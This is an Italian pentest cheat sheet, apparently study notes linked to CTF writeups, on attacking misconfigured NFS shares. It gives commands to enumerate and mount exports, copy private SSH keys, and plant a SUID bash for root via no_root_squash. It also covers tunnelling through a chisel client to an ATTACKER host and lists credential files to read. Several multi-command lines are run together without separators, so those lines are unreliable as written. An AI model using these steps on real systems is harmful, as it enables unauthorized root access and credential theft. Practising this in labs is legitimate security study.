#Exploitation_porte

---
---
---
#### INDICE

- [[#Introduzione]]
- [[#Enumerazione]]
- [[#Mount Remoto]]
- [[#File Upload / Download]]
- [[#No_root_squash]]
- [[#Privilege Escalation Locale]]
- [[#Port Forwarding / Tunneling]]
- [[#File di Configurazione]]

---
---
---
### Introduzione
**NFS (Network File System)** Ã¨ un protocollo che permette la condivisione di directory e file tra sistemi in rete, tipicamente in ambienti Unix/Linux. Opera di default sulla porta TCP/UDP **2049**.  
Se mal configurato, un attaccante puÃ² montare directory remote senza autenticazione, leggere/scrivere file sensibili o addirittura ottenere privilegi root sul sistema target.

---
### Enumerazione
Per prima cosa, identificare le esportazioni disponibili:

```
nmap -sV -p 2049 --script=nfs* TARGET`
```

```
showmount -e TARGET
```

---
### Mount Remoto
Se una directory Ã¨ esposta, la si puÃ² montare localmente:

```
mount -t nfs TARGET:/share /mnt/nfs
```

```
mount -o nolock TARGET:/var/nfs /mnt/nfs
```

ðŸ“š Writeups:
- *Linux:*[[Linux#Kenobi| Kenobi]],
- *Windows:*[[Windows#Remote| Remote]],

---
### File Upload / Download
Una volta montato, Ã¨ possibile scaricare file sensibili o caricarne di nuovi:

```
cp /mnt/nfs/id_rsa ~/.ssh/id_rsa
```

```
echo "malware" > /mnt/nfs/test.txt
```

---
### No_root_squash
Se lâ€™export NFS Ã¨ configurato con lâ€™opzione **no_root_squash**, i file creati come root dal client mantengono i privilegi di root sul server.  
Questo permette di caricare una reverse shell SUID:

```
cp /bin/bash /mnt/nfs/bash_suid chmod +s /mnt/nfs/bash_suid
```

Poi, sul server:

```
./bash_suid -p
```

---
### Privilege Escalation Locale
Spesso i file esportati contengono:
- **Chiavi SSH private** â†’ accesso ad altri utenti.
- **Script di backup** â†’ esecuzione privilegiata.
- **File di configurazione** â†’ credenziali in chiaro.

Esempio:

```
cat /mnt/nfs/home/user/.ssh/id_rsa ssh -i id_rsa user@target
```

---
### Port Forwarding / Tunneling
Se NFS Ã¨ accessibile solo internamente, si puÃ² usare SSH per tunnellizzare la porta:

```
ssh -L 2049:127.0.0.1:2049 user@pivot showmount -e 127.0.0.1
```

Oppure con chisel/socat:

```
chisel client ATTACKER:8000 R:2049:127.0.0.1:2049
```

---
### File di Configurazione
File da controllare per informazioni sensibili:

```
/etc/exports /etc/hosts.allow /etc/hosts.deny /proc/mounts ~/.ssh/id_rsa /home/*/.bash_history
```